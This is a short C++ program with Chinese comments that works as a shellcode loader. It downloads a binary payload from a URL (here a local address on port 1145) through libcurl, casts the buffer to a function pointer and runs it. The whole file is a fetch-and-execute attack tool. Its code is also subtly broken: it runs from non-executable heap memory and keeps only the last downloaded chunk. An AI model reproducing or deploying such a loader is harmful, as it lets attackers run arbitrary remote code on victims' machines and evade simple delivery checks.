/*只有Release x86 x64编译出来的Curl需要Debug的同学自行编译*/
#include <iostream>
#include <curl/curl.h>

void* shellcode;
size_t shellcode_size;

size_t write_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    shellcode = new char[size * nmemb];
    memcpy(shellcode, ptr, size * nmemb);
    shellcode_size = size * nmemb;
    return size * nmemb;
}

int main() {
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:1145/Shellcode.bin"); //Url即为被加载的Shellcode
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    // 这里可以运行shellcode
    typedef void (*ShellcodeFunction)();
    ShellcodeFunction shellcode_func = (ShellcodeFunction)shellcode;
    shellcode_func();

    delete[] shellcode;
    return 0;
}